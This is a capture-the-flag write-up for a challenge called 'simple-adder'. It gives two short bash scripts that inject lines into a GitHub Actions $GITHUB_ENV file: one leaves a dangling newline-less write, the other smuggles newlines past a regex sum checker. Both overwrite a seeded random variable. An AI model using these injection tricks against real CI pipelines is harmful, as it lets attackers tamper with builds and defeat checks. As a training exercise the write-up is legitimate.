# Write up for simple-adder

## Overview

For this challenge we are have a professor that wants us to make a file that adds two numbers; 
however, he only wants lucky students to pass, so we also need a random number he generates using GitHub actions
to equal ```22222```.

## Solution

### Flag 1

#### Method 1

First, we can create a bash script to add the two numbers.
Then, we can write ```random``` to the environment variables such that it seeds ```22222```.
Which we found to be ```21615```. Finally, by writing ```a``` to the enivronment variables without a newline,
when the action later tries to set random, it will instead set
```arandom```, keeping our injected ```random```. Thereby getting the flag. Below is the solution script
```
#!/bin/bash

a=$1
b=$2
sum=$((a + b))
echo $sum
echo "random=21615" >> $GITHUB_ENV
echo -n "a" >> $GITHUB_ENV
```

#### Method 2

For the second method, notice that the sum checker uses regex. Thus, we can use ```echo -e ".*(injection_stuff)?."``` 
to pass the sum checker and be able to inject code. Next, notice that they later save ```sum``` to the environment 
variables, so we'll get ```sum=.*(injection_stuff)``` at the end of the environment variables. Thus, we can overwrite
```random``` in the environment variables using new lines. We find that ```echo -e ".*(\nrandom=21615\na=)?."``` will write
```
sum=.*(
random=21615
a=)?.
```
to the environment variables. Thereby getting us the flag as ```21615``` seeds ```22222```. The solution script is below.

```
#!/bin/bash

echo -e ".*(\nrandom=21615\na=)?."
```
